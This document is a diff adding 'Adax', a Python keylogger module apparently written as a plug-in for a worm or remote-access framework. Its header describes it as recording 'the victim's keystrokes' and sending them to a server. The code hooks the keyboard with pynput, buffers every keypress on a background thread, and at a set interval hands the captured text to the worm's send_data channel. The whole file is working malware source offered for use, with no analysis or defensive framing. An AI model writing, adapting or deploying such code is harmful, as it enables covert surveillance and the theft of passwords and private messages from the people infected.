@@ -1,0 +1,74 @@
+#!name##Adax
+#!types##module
+#!info##[PyEx] A simple python keylogger. Records the victim's keystrokes and sends to the server.
+#!reqVar##ADAX_time##Time interval (seconds) when sending logs.##int
+#!setVar##ADAX_time##60##int
+#!system_FLAG##[W]
+#!TAGS##[PyEx]
+
+
+import pynput
+import threading
+from time import sleep
+
+class Adax:
+    MTYPES = "scout"
+    def __init__(self, worm: object):
+        self.worm = worm
+        self.keys_store = ""
+        self.time_interval = {{ADAX_time}}
+        self.lock = threading.Lock()
+        self.keyboard = None
+    
+    def push_key(self, key) -> None:
+        try:
+            click = key.char
+        except:
+            click = str(key)
+        if click == "Key.space":
+            self.keys_store += " "
+        elif click == "Key.enter":
+            self.keys_store += "\n"
+        elif click.startswith("Key.shift"):
+            self.keys_store += click[9:]
+        elif click == "Key.ctrl_l":
+            self.keys_store += "[L_CTRL]"
+        elif click == "Key.ctrl_r":
+            self.keys_store += "[R_CTRL]"
+        elif click == "Key.alt_l":
+            self.keys_store += "[L_ALT]"
+        elif click == "Key.tab":
+            self.keys_store += "[TAB]"
+        elif click == "Key.esc":
+            self.keys_store += "[ESC]"
+        else:
+            self.keys_store += click
+        
+        
+    
+    def listener(self) -> None:
+        with pynput.keyboard.Listener(on_press=self.push_key) as listener:
+            listener.join()
+    
+    def listener_th(self) -> None:
+        self.keyboard = threading.Thread(target=self.listener, daemon=True)
+        self.keyboard.start()
+
+    def _worker(self) -> None:
+        while self.worm.working:
+            sleep(self.time_interval)
+            with self.lock:
+                if len(self.keys_store) > 0:
+                    if self.worm.is_conn:
+                        data = {"types" : "keyl", "data" : self.keys_store}
+                        self.worm.send_data(data)
+                        self.keys_store = ""
+    
+    def worker(self) -> None:
+        self.worker = threading.Thread(target=self._worker, daemon=True)
+        self.worker.start()
+    
+    def start(self) -> None:
+        self.listener_th()
+        self.worker()
+
